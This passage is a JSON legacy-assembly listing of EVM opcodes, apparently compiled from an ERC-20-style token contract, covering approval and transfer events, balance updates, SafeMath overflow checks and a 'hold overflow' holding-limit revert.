											"name": "SWAP1"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "DUP2"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "MSTORE"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "ADD"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "KECCAK256"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7334,
											"end": 7341,
											"name": "DUP5"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "AND"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "AND"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "DUP2"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "MSTORE"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "ADD"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "SWAP1"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "DUP2"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "MSTORE"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "ADD"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "KECCAK256"
										},
										{
											"begin": 7315,
											"end": 7350,
											"name": "DUP2"
										},
										{
											"begin": 7315,
											"end": 7350,
											"name": "SWAP1"
										},
										{
											"begin": 7315,
											"end": 7350,
											"name": "SSTORE"
										},
										{
											"begin": 7315,
											"end": 7350,
											"name": "POP"
										},
										{
											"begin": 7382,
											"end": 7389,
											"name": "DUP2"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "AND"
										},
										{
											"begin": 7375,
											"end": 7380,
											"name": "DUP4"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "AND"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "PUSH",
											"value": "8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925"
										},
										{
											"begin": 7391,
											"end": 7396,
											"name": "DUP4"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "MLOAD"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "DUP1"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "DUP3"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "DUP2"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "MSTORE"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "ADD"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "SWAP2"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "POP"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "POP"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "MLOAD"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "DUP1"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "SWAP2"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "SUB"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "SWAP1"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "LOG3"
										},
										{
											"begin": 7070,
											"end": 7405,
											"name": "POP"
										},
										{
											"begin": 7070,
											"end": 7405,
											"name": "POP"
										},
										{
											"begin": 7070,
											"end": 7405,
											"name": "POP"
										},
										{
											"begin": 7070,
											"end": 7405,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3215,
											"end": 3632,
											"name": "tag",
											"value": "152"
										},
										{
											"begin": 3215,
											"end": 3632,
											"name": "JUMPDEST"
										},
										{
											"begin": 3359,
											"end": 3388,
											"name": "PUSH [tag]",
											"value": "228"
										},
										{
											"begin": 3381,
											"end": 3387,
											"name": "DUP2"
										},
										{
											"begin": 3359,
											"end": 3368,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3369,
											"end": 3375,
											"name": "DUP7"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "AND"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "AND"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "DUP2"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "MSTORE"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "ADD"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "SWAP1"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "DUP2"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "MSTORE"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "ADD"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "KECCAK256"
										},
										{
											"begin": 3359,
											"end": 3376,
											"name": "SLOAD"
										},
										{
											"begin": 3359,
											"end": 3380,
											"name": "PUSH [tag]",
											"value": "155"
										},
										{
											"begin": 3359,
											"end": 3380,
											"name": "SWAP1"
										},
										{
											"begin": 3359,
											"end": 3388,
											"name": "SWAP2"
										},
										{
											"begin": 3359,
											"end": 3388,
											"name": "SWAP1"
										},
										{
											"begin": 3359,
											"end": 3388,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3359,
											"end": 3388,
											"name": "AND"
										},
										{
											"begin": 3359,
											"end": 3388,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3359,
											"end": 3388,
											"name": "tag",
											"value": "228"
										},
										{
											"begin": 3359,
											"end": 3388,
											"name": "JUMPDEST"
										},
										{
											"begin": 3339,
											"end": 3348,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3349,
											"end": 3355,
											"name": "DUP6"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "AND"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "AND"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "DUP2"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "MSTORE"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "ADD"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "SWAP1"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "DUP2"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "MSTORE"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "ADD"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3339,
											"end": 3356,
											"name": "KECCAK256"
										},
										{
											"begin": 3339,
											"end": 3388,
											"name": "DUP2"
										},
										{
											"begin": 3339,
											"end": 3388,
											"name": "SWAP1"
										},
										{
											"begin": 3339,
											"end": 3388,
											"name": "SSTORE"
										},
										{
											"begin": 3339,
											"end": 3388,
											"name": "POP"
										},
										{
											"begin": 3422,
											"end": 3454,
											"name": "PUSH [tag]",
											"value": "229"
										},
										{
											"begin": 3447,
											"end": 3453,
											"name": "DUP2"
										},
										{
											"begin": 3422,
											"end": 3431,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3432,
											"end": 3441,
											"name": "DUP6"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "AND"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "AND"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "DUP2"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "MSTORE"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "ADD"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "SWAP1"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "DUP2"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "MSTORE"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "ADD"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "KECCAK256"
										},
										{
											"begin": 3422,
											"end": 3442,
											"name": "SLOAD"
										},
										{
											"begin": 3422,
											"end": 3446,
											"name": "PUSH [tag]",
											"value": "160"
										},
										{
											"begin": 3422,
											"end": 3446,
											"name": "SWAP1"
										},
										{
											"begin": 3422,
											"end": 3454,
											"name": "SWAP2"
										},
										{
											"begin": 3422,
											"end": 3454,
											"name": "SWAP1"
										},
										{
											"begin": 3422,
											"end": 3454,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3422,
											"end": 3454,
											"name": "AND"
										},
										{
											"begin": 3422,
											"end": 3454,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3422,
											"end": 3454,
											"name": "tag",
											"value": "229"
										},
										{
											"begin": 3422,
											"end": 3454,
											"name": "JUMPDEST"
										},
										{
											"begin": 3399,
											"end": 3408,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3409,
											"end": 3418,
											"name": "DUP5"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "AND"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "AND"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "DUP2"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "MSTORE"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "ADD"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "SWAP1"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "DUP2"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "MSTORE"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "ADD"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3399,
											"end": 3419,
											"name": "KECCAK256"
										},
										{
											"begin": 3399,
											"end": 3454,
											"name": "DUP2"
										},
										{
											"begin": 3399,
											"end": 3454,
											"name": "SWAP1"
										},
										{
											"begin": 3399,
											"end": 3454,
											"name": "SSTORE"
										},
										{
											"begin": 3399,
											"end": 3454,
											"name": "POP"
										},
										{
											"begin": 3470,
											"end": 3488,
											"name": "PUSH [tag]",
											"value": "230"
										},
										{
											"begin": 3478,
											"end": 3487,
											"name": "DUP3"
										},
										{
											"begin": 3470,
											"end": 3477,
											"name": "PUSH [tag]",
											"value": "104"
										},
										{
											"begin": 3470,
											"end": 3488,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3470,
											"end": 3488,
											"name": "tag",
											"value": "230"
										},
										{
											"begin": 3470,
											"end": 3488,
											"name": "JUMPDEST"
										},
										{
											"begin": 3465,
											"end": 3574,
											"name": "PUSH [tag]",
											"value": "231"
										},
										{
											"begin": 3465,
											"end": 3574,
											"name": "JUMPI"
										},
										{
											"begin": 3537,
											"end": 3544,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 3537,
											"end": 3544,
											"name": "SLOAD"
										},
										{
											"begin": 3513,
											"end": 3522,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3523,
											"end": 3532,
											"name": "DUP5"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "AND"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "AND"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "DUP2"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "MSTORE"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "ADD"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "SWAP1"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "DUP2"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "MSTORE"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "ADD"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "KECCAK256"
										},
										{
											"begin": 3513,
											"end": 3533,
											"name": "SLOAD"
										},
										{
											"begin": 3513,
											"end": 3544,
											"name": "GT"
										},
										{
											"begin": 3513,
											"end": 3544,
											"name": "ISZERO"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "PUSH [tag]",
											"value": "232"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "JUMPI"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "MLOAD"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "DUP2"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "MSTORE"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "ADD"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "DUP1"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "DUP1"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "ADD"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "DUP3"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "DUP2"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "SUB"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "DUP3"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "MSTORE"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "PUSH",
											"value": "D"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "DUP2"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "MSTORE"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "ADD"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "DUP1"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "PUSH",
											"value": "686F6C64206F766572666C6F7700000000000000000000000000000000000000"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "DUP2"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "MSTORE"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "POP"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "ADD"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "SWAP2"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "POP"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "POP"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "MLOAD"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "DUP1"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "SWAP2"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "SUB"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "SWAP1"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "REVERT"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "tag",
											"value": "232"
										},
										{
											"begin": 3505,
											"end": 3562,
											"name": "JUMPDEST"
										},
										{
											"begin": 3465,
											"end": 3574,
											"name": "tag",
											"value": "231"
										},
										{
											"begin": 3465,
											"end": 3574,
											"name": "JUMPDEST"
										},
										{
											"begin": 3606,
											"end": 3615,
											"name": "DUP2"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "AND"
										},
										{
											"begin": 3598,
											"end": 3604,
											"name": "DUP4"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "AND"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "PUSH",
											"value": "DDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF"
										},
										{
											"begin": 3617,
											"end": 3623,
											"name": "DUP4"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "MLOAD"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "DUP1"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "DUP3"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "DUP2"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "MSTORE"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "ADD"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "SWAP2"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "POP"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "POP"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "MLOAD"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "DUP1"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "SWAP2"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "SUB"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "SWAP1"
										},
										{
											"begin": 3589,
											"end": 3624,
											"name": "LOG3"
										},
										{
											"begin": 3215,
											"end": 3632,
											"name": "POP"
										},
										{
											"begin": 3215,
											"end": 3632,
											"name": "POP"
										},
										{
											"begin": 3215,
											"end": 3632,
											"name": "POP"
										},
										{
											"begin": 3215,
											"end": 3632,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "tag",
											"value": "155"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "JUMPDEST"
										},
										{
											"begin": 1373,
											"end": 1380,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1406,
											"end": 1407,
											"name": "DUP3"
										},
										{
											"begin": 1401,
											"end": 1402,
											"name": "DUP3"
										},
										{
											"begin": 1401,
											"end": 1407,
											"name": "GT"
										},
										{
											"begin": 1401,
											"end": 1407,
											"name": "ISZERO"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH [tag]",
											"value": "234"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "JUMPI"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "MLOAD"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP3"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "SUB"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP3"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "1E"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "536166654D6174683A207375627472616374696F6E206F766572666C6F770000"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP2"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "MSTORE"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "POP"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "ADD"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "SWAP2"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "POP"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "POP"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "MLOAD"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "DUP1"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "SWAP2"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "SUB"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "SWAP1"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "REVERT"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "tag",
											"value": "234"
										},
										{
											"begin": 1393,
											"end": 1442,
											"name": "JUMPDEST"
										},
										{
											"begin": 1453,
											"end": 1462,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1469,
											"end": 1470,
											"name": "DUP3"
										},
										{
											"begin": 1465,
											"end": 1466,
											"name": "DUP5"
										},
										{
											"begin": 1465,
											"end": 1470,
											"name": "SUB"
										},
										{
											"begin": 1453,
											"end": 1470,
											"name": "SWAP1"
										},
										{
											"begin": 1453,
											"end": 1470,
											"name": "POP"
										},
										{
											"begin": 1490,
											"end": 1491,
											"name": "DUP1"
										},
										{
											"begin": 1483,
											"end": 1491,
											"name": "SWAP2"
										},
										{
											"begin": 1483,
											"end": 1491,
											"name": "POP"
										},
										{
											"begin": 1483,
											"end": 1491,
											"name": "POP"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "SWAP3"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "SWAP2"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "POP"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "POP"
										},
										{
											"begin": 1315,
											"end": 1499,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "tag",
											"value": "160"
										},
										{
											"begin": 859,
											"end": 1040,
											"name": "JUMPDEST"
										},
										{
											"begin": 917,
											"end": 924,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 937,
											"end": 946,
											"name": "DUP1"
										},
										{
											"begin": 953,
											"end": 954,
											"name": "DUP3"
										},
										{
											"begin": 949,
											"end": 950,
											"name": "DUP5"
										},
										{
											"begin": 949,
											"end": 954,
											"name": "ADD"
										},
										{
											"begin": 937,
											"end": 954,
											"name": "SWAP1"
										},
										{
											"begin": 937,
											"end": 954,
											"name": "POP"
										},
										{
											"begin": 978,
											"end": 979,
											"name": "DUP4"
										},
										{
											"begin": 973,
											"end": 974,
											"name": "DUP2"
										},
										{
											"begin": 973,
											"end": 979,
											"name": "LT"
										},
										{
											"begin": 973,
											"end": 979,
											"name": "ISZERO"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH [tag]",
											"value": "236"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "JUMPI"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "MLOAD"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP2"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "MSTORE"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "ADD"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP1"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP1"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "ADD"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP3"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP2"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "SUB"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP3"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "MSTORE"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "1B"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "DUP2"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "MSTORE"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 965,
											"end": 1011,
											"name": "ADD"
										},
										{
											"begin": 965,
											"end": 1011,
